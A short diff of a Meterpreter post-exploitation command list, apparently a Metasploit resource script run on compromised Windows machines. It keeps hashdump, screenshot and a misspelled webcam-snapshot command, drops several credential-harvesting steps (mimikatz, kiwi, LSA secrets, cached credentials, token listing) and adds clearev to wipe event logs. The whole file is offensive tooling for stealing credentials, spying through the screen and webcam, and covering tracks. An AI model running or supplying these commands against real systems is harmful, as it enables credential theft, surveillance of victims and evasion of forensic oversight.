@@ -1,14 +1,5 @@
-run post/windows/manage/priv_migrate
 hashdump
-load kiwi
-creds_all
-run post/windows/gather/lsa_secrets
-run post/windows/gather/cachedump
-load incognito
-list_tokens -u
 screenshot
-webcam_list
 webcan_snap -v false
-load mimikatz
-kerberos
+clearev
 background
